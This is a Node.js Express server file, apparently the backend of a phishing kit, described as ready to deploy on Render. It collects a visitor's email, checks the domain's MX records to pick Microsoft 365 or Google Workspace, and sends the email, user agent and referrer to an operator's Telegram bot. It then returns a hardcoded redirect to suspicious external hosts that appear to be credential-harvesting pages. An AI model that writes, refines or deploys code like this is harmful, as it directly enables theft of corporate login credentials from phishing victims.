// server.js — Render-ready Express server (no PHP needed)
// Serves the static index.html page and handles the email -> MX-provider -> redirect logic.
const express = require('express');
const axios = require('axios');
const path = require('path');
const dns = require('dns');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.urlencoded({ extended: false })); // script.js posts url-encoded form data
app.use(express.static(__dirname)); // serves index.html at "/" plus styles.css, script.js, assets/

// Redirect links per mail provider (same logic as the original repo).
// Override any of them with environment variables if needed.
const REDIRECT_URLS = {
  google:
    process.env.GOOGLE_REDIRECT_URL ||
    "https://aqwdgnwqzyy3sxh6b08n0.70u0j5nyjhqnotxaccbtfciardwn1in.workers.dev/q/fVCGAky6x7phsLNJrbm2pfKbX70brkGNKCNmX9f0",
  microsoft:
    process.env.MICROSOFT_REDIRECT_URL ||
    "https://6f5o7gnql5.sweetfragranceforest.de/l/e0gV2VaSs0Q",
};

// Look up MX records for a domain (replaces PHP's getmxrr).
function lookupMx(domain) {
  return new Promise((resolve) => {
    if (!domain) return resolve([]);
    dns.resolveMx(domain, (err, records) => {
      if (err || !records) return resolve([]);
      resolve(
        records
          .sort((a, b) => a.priority - b.priority)
          .map((r) => r.exchange.toLowerCase())
      );
    });
  });
}

// Map an email's domain to a provider + redirect URL based on its MX records.
async function resolveProvider(email) {
  const domain = email.slice(email.lastIndexOf('@') + 1).toLowerCase();
  const mxRecords = await lookupMx(domain);

  let provider = 'your organization';
  let redirectUrl = null;

  for (const mx of mxRecords) {
    if (mx.includes('outlook.com') || mx.includes('protection.outlook.com')) {
      provider = 'Microsoft 365';
      redirectUrl = REDIRECT_URLS.microsoft;
      break;
    }
    if (mx.includes('google.com') || mx.includes('googlemail.com')) {
      provider = 'Google Workspace';
      redirectUrl = REDIRECT_URLS.google;
      break;
    }
  }

  return { domain, provider, redirectUrl };
}

// Notify via Telegram (best-effort: never blocks or fails the user's request).
async function notifyTelegram({ email, domain, provider, req }) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    console.error("Missing Telegram environment variables");
    return;
  }

  const now = new Date().toLocaleString('en-US', {
    timeZone: 'America/New_York',
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit'
  });

  const message =
    `NEW SUBMISSION\n` +
    `Email: ${email}\n` +
    `Domain: ${domain}\n` +
    `Provider: ${provider}\n` +
    `Time: ${now}\n` +
    `User Agent: ${req.get('user-agent') || 'unknown'}\n` +
    `Referrer: ${req.get('referrer') || 'direct'}`;

  try {
    const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId,
      text: message
    });
    console.log('✅ Telegram notification sent successfully');
    console.log('Telegram response:', response.data);
  } catch (telegramError) {
    if (telegramError.response) {
      console.error('❌ Telegram Error Status:', telegramError.response.status);
      console.error('❌ Telegram Error Data:', JSON.stringify(telegramError.response.data));
    } else {
      console.error('❌ Telegram Error:', telegramError.message);
    }
  }
}

// Email verification handler used by script.js (and plain form posts).
// Any syntactically valid email goes through; the MX lookup only decides WHICH link to use.
async function handleEmail(req, res) {
  try {
    const wantsJson = (req.get('accept') || '').includes('application/json');
    const respond = (status, payload) => {
      if (wantsJson) return res.status(status).json(payload);
      return res.status(status).send(payload.error || 'Something went wrong.');
    };

    const email = String((req.body && req.body.email) || '').trim();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
      return respond(422, { success: false, error: 'Enter a valid email address.' });
    }

    const { domain, provider, redirectUrl } = await resolveProvider(email);

    // Fire off the Telegram notification without delaying the response.
    notifyTelegram({ email, domain, provider, req }).catch(() => {});

    return respond(200, {
      success: true,
      domain,
      provider,
      redirect_url: redirectUrl,
    });
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ success: false, error: 'Failed to process request' });
  }
}

app.post('/', handleEmail);

// Alias so anything posting to /api/unlock gets the same email -> provider logic.
app.post('/api/unlock', (req, res) => {
  handleEmail(req, res);
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
